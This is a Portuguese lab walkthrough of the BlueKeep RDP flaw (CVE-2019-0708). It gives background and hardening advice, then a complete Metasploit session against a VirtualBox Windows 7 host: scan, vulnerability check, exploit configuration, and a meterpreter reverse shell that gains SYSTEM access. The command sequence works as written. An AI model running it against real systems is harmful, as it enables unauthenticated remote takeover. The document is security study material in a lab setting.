# Vunerabilidade Window - BlueKeep

A vulnerabilidade **BlueKeep** (CVE-2019-0708) é uma falha crítica descoberta em 2019 no **Remote Desktop Services (RDS)** do Windows, também conhecido como **Terminal Services**.

### Principais características

* **Tipo de falha:** Execução remota de código (RCE).
* **Causa:** Validação insuficiente de requisições enviadas via **RDP (Remote Desktop Protocol)**, permitindo que um invasor não autenticado envie pacotes especialmente criados para explorar a memória do serviço.
* **Sistemas afetados:**
  * Windows XP
  * Windows Vista
  * Windows 7
  * Windows Server 2003
  * Windows Server 2008 / 2008 R2
* **Impacto:** Como o ataque pode ocorrer **antes de login**, não é necessário que o invasor tenha credenciais. Isso abre caminho para **worms automáticos**, semelhantes ao WannaCry, capazes de se espalhar rapidamente em redes vulneráveis.

### Riscos
* **Execução remota:** O invasor pode executar código arbitrário no sistema alvo com privilégios de **SYSTEM**, o mais alto do Windows.
* **Autopropagação:** A falha pode ser usada para criar worms, explorando múltiplos computadores em cascata sem interação do usuário.
* **Comprometimento total:** O invasor pode instalar programas, roubar dados, criar novas contas de usuário e controlar a máquina remotamente.

### Porta 3389/TCP

Usada pelo **RDP (Remote Desktop Protocol)**, o protocolo de **Área de Trabalho Remota** da Microsoft. Normalmente habilitada em redes de coorporações (raramente em redes pequenas e domésticas).

#### Função principal

* Permite que um usuário se conecte a outro computador Windows (ou servidor) e controle sua interface gráfica remotamente, como se estivesse sentado na frente da máquina.
* É a porta padrão do **Remote Desktop Services (RDS)**, antes chamado de Terminal Services.

#### Exemplos de uso

* **Administradores de rede** usam o RDP para gerenciar servidores sem precisar estar fisicamente no data center.
* **Suporte técnico** pode acessar máquinas de usuários para resolver problemas.
* Usuários comuns podem acessar o computador do trabalho a partir de casa.

#### Segurança
* Como a porta 3389 expõe diretamente o serviço de desktop remoto, deixá-la aberta para a internet **sem proteção** é um risco grave:
* Boas práticas
  * Alterar a porta padrão (embora isso só reduza ataques automáticos).
  * Restringir o acesso via firewall (permitir apenas IPs específicos).
  * Usar **VPN** para acessar a rede interna antes do RDP.
  * Habilitar **MFA (autenticação multifator)**.
  * Manter o Windows sempre atualizado.

## Verificando a vunerabilidade
### Scanner da máquina alvo
```
$ nmap -sS -sV 192.168.1.37
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-28 21:43 -03
Nmap scan report for 192.168.1.37
Host is up (0.0010s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49155/tcp open  msrpc        Microsoft Windows RPC
49156/tcp open  msrpc        Microsoft Windows RPC
49157/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 08:00:27:81:E9:65 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: WIN7-X64; OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.62 seconds
```
Observamos que a porta 3389 está aberto executando o serviço tcpwrapped.
### Verificando a existência da vunerabilidade
```
msf6 > search bluekeep

Matching Modules
================

   #   Name                                                                Disclosure Date  Rank    Check  Description
   -   ----                                                                ---------------  ----    -----  -----------
   0   auxiliary/scanner/rdp/cve_2019_0708_bluekeep                        2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
   1     \_ action: Crash                                                  .                .       .      Trigger denial of service vulnerability
   2     \_ action: Scan                                                   .                .       .      Scan for exploitable targets
   3   exploit/windows/rdp/cve_2019_0708_bluekeep_rce                      2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
   4     \_ target: Automatic targeting via fingerprinting                 .                .       .      .
   5     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64)                 .                .       .      .
   6     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)  .                .       .      .
   7     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)     .                .       .      .
   8     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)     .                .       .      .
   9     \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)   .                .       .      .
   10    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)       .                .       .      .
   11    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)           .                .       .      .
   12    \_ target: Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)      .                .       .      .


Interact with a module by name or index. For example info 12, use 12 or use exploit/windows/rdp/cve_2019_0708_bluekeep_rce                                                                          
After interacting with a module you can manually set a TARGET with set TARGET 'Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)'
```
```
msf6 > show info auxiliary/scanner/rdp/cve_2019_0708_bluekeep

       Name: CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
     Module: auxiliary/scanner/rdp/cve_2019_0708_bluekeep
    License: Metasploit Framework License (BSD)
       Rank: Normal
  Disclosed: 2019-05-14

Provided by:
  National Cyber Security Centre
  JaGoTu
  zerosum0x0
  Tom Sellers

Module stability:
 crash-safe

Available actions:
    Name   Description
    ----   -----------
    Crash  Trigger denial of service vulnerability
=>  Scan   Scan for exploitable targets

Check supported:
  Yes

Basic options:
  Name             Current Setting  Required  Description
  ----             ---------------  --------  -----------
  RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
  RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect,
                                               UNSET = random
  RDP_DOMAIN                        no        The client domain name to report during connect
  RDP_USER                          no        The username to report during connect, UNSET = ran
                                              dom
  RHOSTS                            yes       The target host(s), see https://docs.metasploit.co
                                              m/docs/using-metasploit/basics/using-metasploit.ht
                                              ml
  RPORT            3389             yes       The target port (TCP)
  THREADS          1                yes       The number of concurrent threads (max one per host
                                              )

Description:
  This module checks a range of hosts for the CVE-2019-0708 vulnerability
  by binding the MS_T120 channel outside of its normal slot and sending
  non-DoS packets which respond differently on patched and vulnerable hosts.
  It can optionally trigger the DoS vulnerability.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2019-0708
  https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2019-0708
  https://zerosum0x0.blogspot.com/2019/05/avoiding-dos-how-bluekeep-scanners-work.html

Also known as:
  BlueKeep
```
```
msf6 > use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
[*] Using action Scan - view all 2 actions with the show actions command
```
Configurando o **host** da **máquina alvo**
```
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > set RHOSTS 192.168.1.37
RHOSTS => 192.168.1.37
```
```
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > show options

Module options (auxiliary/scanner/rdp/cve_2019_0708_bluekeep):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
   RDP_CLIENT_NAME  rdesktop         no        The client computer name to report during connect
                                               , UNSET = random
   RDP_DOMAIN                        no        The client domain name to report during connect
   RDP_USER                          no        The username to report during connect, UNSET = ra
                                               ndom
   RHOSTS           192.168.1.37     yes       The target host(s), see https://docs.metasploit.c
                                               om/docs/using-metasploit/basics/using-metasploit.
                                               html
   RPORT            3389             yes       The target port (TCP)
   THREADS          1                yes       The number of concurrent threads (max one per hos
                                               t)


Auxiliary action:

   Name  Description
   ----  -----------
   Scan  Scan for exploitable targets
```
```
msf6 auxiliary(scanner/rdp/cve_2019_0708_bluekeep) > run
[+] 192.168.1.37:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.1.37:3389     - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```
A máquina alvo está vunerável.
## Explorando a vunerabilidade
```
msf6 > show info exploit/windows/rdp/cve_2019_0708_bluekeep_rce

       Name: CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
     Module: exploit/windows/rdp/cve_2019_0708_bluekeep_rce
   Platform: Windows
       Arch: 
 Privileged: Yes
    License: Metasploit Framework License (BSD)
       Rank: Manual
  Disclosed: 2019-05-14

Provided by:
  Sean Dillon <sean.dillon@risksense.com>
  Ryan Hanson
  OJ Reeves <oj@beyondbinary.io>
  Brent Cook <bcook@rapid7.com>

Available targets:
      Id  Name
      --  ----
  =>  0   Automatic targeting via fingerprinting
      1   Windows 7 SP1 / 2008 R2 (6.1.7601 x64)
      2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
      3   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 14)
      4   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15)
      5   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - VMWare 15.1)
      6   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Hyper-V)
      7   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - AWS)
      8   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - QEMU/KVM)

Check supported:
  Yes

Basic options:
  Name             Current Setting  Required  Description
  ----             ---------------  --------  -----------
  RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
  RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect,
                                               UNSET = random
  RDP_DOMAIN                        no        The client domain name to report during connect
  RDP_USER                          no        The username to report during connect, UNSET = ran
                                              dom
  RHOSTS                            yes       The target host(s), see https://docs.metasploit.co
                                              m/docs/using-metasploit/basics/using-metasploit.ht
                                              ml
  RPORT            3389             yes       The target port (TCP)

Payload information:
  Space: 952

Description:
  The RDP termdd.sys driver improperly handles binds to internal-only channel MS_T120,
  allowing a malformed Disconnect Provider Indication message to cause use-after-free.
  With a controllable data/size remote nonpaged pool spray, an indirect call gadget of
  the freed channel is used to achieve arbitrary code execution.

  Windows 7 SP1 and Windows Server 2008 R2 are the only currently supported targets.

  Windows 7 SP1 should be exploitable in its default configuration, assuming your target
  selection is correctly matched to the system's memory layout.

  HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam
  *needs* to be set to 0 for exploitation to succeed against Windows Server 2008 R2.
  This is a non-standard configuration for normal servers, and the target will crash if
  the aforementioned Registry key is not set!

  If the target is crashing regardless, you will likely need to determine the non-paged
  pool base in kernel memory and set it as the GROOMBASE option.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2019-0708
  https://github.com/zerosum0x0/CVE-2019-0708
  https://zerosum0x0.blogspot.com/2019/11/fixing-remote-windows-kernel-payloads-meltdown.html

Also known as:
  Bluekeep


View the full module info with the info -d command.

[-] Invalid parameter "exploit/windows/rdp/cve_2019_0708_bluekeep_rce", use "show -h" for more information
```
```
msf6 > use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
```
Configurando o exploit
```
msf6 > set RHOSTS 192.168.1.37
RHOSTS => 192.168.1.37
```
Há, neste caso, a necessidade de configurar o target manualmente. Como a máquina alvo está sendo executada no VirtualBox:
```
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > set target 2
target => 2
```
Verificando...
```
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > show options

Module options (exploit/windows/rdp/cve_2019_0708_bluekeep_rce):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   RDP_CLIENT_IP    192.168.0.100    yes       The client IPv4 address to report during connect
   RDP_CLIENT_NAME  ethdev           no        The client computer name to report during connect
                                               , UNSET = random
   RDP_DOMAIN                        no        The client domain name to report during connect
   RDP_USER                          no        The username to report during connect, UNSET = ra
                                               ndom
   RHOSTS           192.168.1.37     yes       The target host(s), see https://docs.metasploit.c
                                               om/docs/using-metasploit/basics/using-metasploit.
                                               html
   RPORT            3389             yes       The target port (TCP)


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none
                                        )
   LHOST     192.168.1.10     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   2   Windows 7 SP1 / 2008 R2 (6.1.7601 x64 - Virtualbox 6)
```
## Executando o exploit

```
msf6 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) > run
[*] Started reverse TCP handler on 192.168.1.10:4444 
[*] 192.168.1.37:3389 - Running automatic check ("set AutoCheck false" to disable)
[*] 192.168.1.37:3389 - Using auxiliary/scanner/rdp/cve_2019_0708_bluekeep as check
[+] 192.168.1.37:3389     - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.1.37:3389     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.37:3389 - The target is vulnerable. The target attempted cleanup of the incorrectly-bound MS_T120 channel.
[*] 192.168.1.37:3389 - Using CHUNK grooming strategy. Size 250MB, target address 0xfffffa8011e07000, Channel count 1.
[!] 192.168.1.37:3389 - <---------------- | Entering Danger Zone | ---------------->
[*] 192.168.1.37:3389 - Surfing channels ...
[*] 192.168.1.37:3389 - Lobbing eggs ...
[*] 192.168.1.37:3389 - Forcing the USE of FREE'd object ...
[!] 192.168.1.37:3389 - <---------------- | Leaving Danger Zone | ---------------->
[*] Sending stage (203846 bytes) to 192.168.1.37
[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.37:49159) at 2025-08-28 22:08:47 -0300

meterpreter > getuid
Server username: AUTORIDADE NT\SISTEMA
meterpreter > 
meterpreter > shell
Process 1088 created.
Channel 1 created.
Microsoft Windows [vers�o 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. Todos os direitos reservados.

C:\Windows\system32>
```
Mais uma vez, conseguimos acesso a conta **AUTORIDADE NT\SISTEMA**



